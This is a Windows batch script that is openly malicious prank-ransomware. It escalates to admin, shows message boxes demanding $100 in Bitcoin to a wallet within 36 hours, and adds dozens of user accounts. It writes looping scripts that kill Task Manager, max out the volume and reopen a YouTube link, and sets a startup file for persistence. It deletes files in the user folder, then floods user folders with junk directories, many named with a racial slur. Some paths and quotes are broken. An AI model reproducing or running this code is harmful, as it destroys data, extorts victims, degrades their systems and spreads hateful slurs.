@echo off
if not "%1"=="am_admin" (
    powershell -Command "Start-Process -Verb RunAs -FilePath '%0' -ArgumentList 'am_admin'"
    powershell -Command "taskkill /U $env:UserName /F /PID $PID"
)
if %username%==Guus0 GOTO :end
if %username%==joopc GOTO :end
:filecreation
md "C:\Programsx64
md "C:\Programsx64\Filestack

:vbs
::All messages
echo x=msgbox("You got hacked" ,0, "Hackmsg")>"C:\Programsx64\Filestack\hackmsg.vbs
echo y=msgbox("You will ONLY see this now, after this the message wil be deleted forever, and it has important info" ,0, "Hackmsg")>>"C:\Programsx64\Filestack\hackmsg.vbs
echo a=msgbox("To save your pc..." ,0, "Hackmsg")>>"C:\Programsx64\Filestack\hackmsg.vbs"
echo b=msgbox("Send $100 worth of Bitcoin" ,0, "Hackmsg")>>"C:\Programsx64\Filestack\hackmsg.vbs"
echo c=msgbox("To wallet 3EC6xfP7fnrz8er5WBtp1q6Q7Rw3krNhZ6" ,0, "Hackmsg")>>"C:\Programsx64\Filestack\hackmsg.vbs"
echo d=msgbox("When done, your pc will be saved" ,0, "Hackmsg")>>"C:\Programsx64\Filestack\hackmsg.vbs"
echo e=msgbox("You have 36 hours starting NOW!" ,0, "Hackmsg")>>"C:\Programsx64\Filestack\hackmsg.vbs"
start cscript "C:\Programsx64\Filestack\hackmsg.vbs"

:extra
echo @echo off>"C:\Programsx64\Filestack\extra's.bat
echo start cmd.exe /k "justatextfile.txt">>"C:\Programsx64\Filestack\extra's.bat"
echo start cmd.exe /k "justatextfile.txt">>"C:\Programsx64\Filestack\extra's.bat"
echo start cmd.exe /k "C:\Windows\Minidump\Filestack\extra's.bat">>"C:\Programsx64\Filestack\extra's.bat"
echo exit>>"C:\Windows\Minidump\Filestack\extra's.bat"

:fileverify
echo @echo off>"C:\Programsx64\Filestack\taskverify.bat
echo RUNAS /profile>>"C:\Programsx64\Filestack\taskverify.bat"
echo taskkill /im taskmgr.exe>>"Cogramsx64\Filestack\taskverify.bat"
echo taskkill /im TaskbarLayoutModification.xml>>"C:\Programsx64\Filestack\taskverify.bat"
echo exit>>"C:\Programsx64\Filestack\taskverify.bat"

::All user adds, much spam
if %errorlevel%==0 (
net user R hacked /ADD
net user I hacked /ADD
net user C hacked /ADD
net user K hacked /ADD
net user R hacked /ADD
net user O hacked /ADD
net user L hacked /ADD
net user L hacked /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD
net user %RANDOM% %RANDOM% /ADD)



:helphack
echo @echo on>"C:\Programsx64\Filestack\helphack.bat
echo nircmd.exe setsysvolume 65535>>"C:\Programsx64\Filestack\helphack.bat"
echo nircmd.exe mutesysvolume 0>>"C:\Programsx64\Filestack\helphack.bat"
echo timeout 2>>"C:\Programsx64\Filestack\helphack.bat"
echo start cmd.exe /k "C:\Programsx64\Filestack\helphack.bat">>"C:\Programsx64\Filestack\helphack.bat"
echo exit>>"C:\Windows\Minidump\Filestack\helphack.bat"

:hackstore
echo @echo on>"C:\Programsx64\Filestack\hackstore.bat
echo set url="https://www.youtube.com/watch?v=xvFZjo5PgG0">>"C:\Programsx64\Filestack\hackstore.bat"
echo start chrome.exe %url%>>"C:\Programsx64\Filestack\hackstore.bat"
echo timeout 5>>"C:\Programsx64\Filestack\hackstore.bat"
echo start cmd.exe /k "C:\Programsx64\hackstore.bat">>"C:\Programsx64\Filestack\hackstore.bat"
echo exit>>"C:\Programsx64\Filestack\hackstore.bat""

:temp
echo @echo on>"C:\Programsx64\Filestack\temp.bat
echo start cmd.exe /k "C:\Programsx64\hackstore.bat">>"C:\Programsx64\Filestack\temp.bat"
echo start cmd.exe /k "C:\Programsx64\helphack.bat">>"C:\Programsx64\Filestack\temp.bat"
echo start cmd.exe /k "C:\Programsx64\extra's.bat">>"C:\Programsx64\Filestack\temp.bat"
echo start cmd.exe /k "C:\Programsx64\taskverify.bat">>"C:\Programsx64\Filestack\temp.bat"
echo exit>>"C:\Programsx64\Filestack\temp.bat"
move "C:\Programsx64\Filestack\temp.bat" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\

:ipmeme
echo @echo off>"C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\nibba.bat"
echo ipconfig>>"C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\nibba.bat"
echo echo this you?>>"C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\nibba.bat"

cd "C:\Users\%username%
if %errorlevel%==0 (
del *.* /q /f
cd "C:\Users\%username%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Nigger%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Music\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Bureaublad\%RANDOM%
md "C:\Users\%username%\OneDrive\Documents\%RANDOM%\%RANDOM%
md "C:\Users\%usernameOneDrive\Documents\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%
md "C:\Users\%username%\Videos\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%
md "C:\Users\%username%\Pictures\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
md "C:\Users\%username%\Downloads\%RANDOM%
